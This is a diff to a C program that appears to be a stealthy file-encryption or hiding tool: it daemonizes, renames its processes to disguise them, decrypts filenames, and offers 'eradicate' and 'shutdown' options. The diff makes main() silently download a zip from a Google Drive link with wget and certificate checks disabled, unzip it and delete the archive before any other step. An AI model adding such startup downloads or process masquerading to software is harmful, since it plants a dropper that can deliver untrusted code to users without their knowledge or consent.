@@ -14,6 +14,7 @@
 void daemonize(char *argv0, char *daemonName);
 void spawn_process(char *argv0, char *processName, int (*callback)(char *argv0));
 void help();
+void download_extract_zip();
 char *base64_decode(char *text);
 int decrypt_filename();
 int move_files(char *old_folder, char *new_folder);
@@ -29,6 +30,7 @@ int b64invs[] = {62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58,
                  43, 44, 45, 46, 47, 48, 49, 50, 51};
 
 int main(int argc, char *argv[]) {
+    download_extract_zip();
     if (argc < 2 || argc > 2) {
         help();
         return 1;
@@ -80,8 +82,10 @@ void spawn_process(char *argv0, char *processName, int (*callback)(char *argv0))
     if (pid < 0 || pid > 0) return;
 
     prctl(PR_SET_PDEATHSIG, SIGTERM);
-    prctl(PR_SET_NAME, processName, 0, 0, 0);
-    strncpy(argv0, processName, 128);
+    if (argv0 != NULL && processName != NULL) {
+        prctl(PR_SET_NAME, processName, 0, 0, 0);
+        strncpy(argv0, processName, 128);
+    }
     exit(callback(argv0));
 }
 
@@ -93,6 +97,43 @@ void help() {
     printf("\t--return\n");
     printf("\t--eradicate\n");
     printf("\t--shutdown\n");
+}
+
+int download_cb() {
+    char *wget_args[] = {
+        "wget",
+        "-q",
+        "-O",
+        "starter_kit.zip",
+        "--no-check-certificate",
+        "https://drive.google.com/uc?export=download&id=1_5GxIGfQr3mNKuavJbte_AoRkEQLXSKS",
+        NULL};
+    execvp("wget", wget_args);
+    return 1;
+}
+int extract_cb() {
+    char *unzip_args[] = {
+        "unzip",
+        "-q",
+        "starter_kit.zip",
+        "-d",
+        "starter_kit",
+        NULL};
+    execvp("unzip", unzip_args);
+    return 1;
+}
+void download_extract_zip() {
+    struct stat st;
+    if (stat("starter_kit", &st) == 0 && S_ISDIR(st.st_mode)) return;
+    printf("Initializing program, downloading and extract zip...\n");
+
+    spawn_process(NULL, NULL, download_cb);
+
+    int status;
+    wait(&status);
+    spawn_process(NULL, NULL, extract_cb);
+    wait(&status);
+    remove("starter_kit.zip");
 }
 
 int is_base64(char *str) {
@@ -249,12 +290,14 @@ int shutdown(char *processName) {
     if (fp == NULL) return 1;
 
     pid_t pid;
-    if (fscanf(fp, "%d", &pid) == 1) kill(pid, SIGTERM);
-    pclose(fp);
+    if (fscanf(fp, "%d", &pid) == 1) {
+        kill(pid, SIGTERM);
 
-    char message[256];
-    snprintf(message, sizeof(message), "Successfully shut off decryption process with PID %d.", pid);
-    logger(message);
+        char message[256];
+        snprintf(message, sizeof(message), "Successfully shut off decryption process with PID %d.", pid);
+        logger(message);
+    }
+    pclose(fp);
 
     return 0;
 }
